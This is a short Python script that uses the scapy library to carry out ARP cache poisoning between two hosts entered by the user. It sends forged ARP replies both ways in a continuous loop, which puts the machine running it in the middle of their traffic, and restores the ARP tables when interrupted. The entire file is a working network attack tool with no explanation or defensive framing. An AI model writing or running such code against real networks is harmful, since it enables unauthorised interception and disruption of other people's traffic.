from scapy.layers.l2 import Ether, ARP,srp
from scapy.all import send
import socket as sc


def get_MAC_from_IP(ip_ad):
    temp=Ether(dst='ff:ff:ff:ff:ff:ff')
    temp=temp/ARP(pdst = ip_ad)
    res, _ = srp(temp, timeout = 5, verbose = 0)
    if res:
        return res[0][1].src



def spoof_func(src_hn,dest_hn):
    source_ip = sc.gethostbyname(src_hn)
    dest_ip = sc.gethostbyname(dest_hn)
    source_MAC = get_MAC_from_IP(source_ip)
    spoof =ARP(op = 2, pdst = source_ip, psrc = dest_ip, hwdst = source_MAC)
    send(spoof, verbose=0)


def reset(src_hn,dest_hn):
    source_ip = sc.gethostbyname(src_hn)
    dest_ip = sc.gethostbyname(dest_hn)
    source_MAC = get_MAC_from_IP(source_ip)
    dest_MAC = get_MAC_from_IP(dest_ip)
    restore = ARP(op=2, pdst=source_ip, hwdst=source_MAC, psrc=dest_ip, hwsrc=dest_MAC)
    send(restore, verbose=0)

def main():
    src=input("Enter the hostname of source ")
    dst = input("Enter the hostname of destination ")

    print("ARP caache poisioning started......")
    try:
        while (True):
            spoof_func(src, dst)
            spoof_func(dst, src)
    except KeyboardInterrupt:
        reset(src, dst)
        reset(dst, src)
        print("The ARP tables are reset!!!")



main()

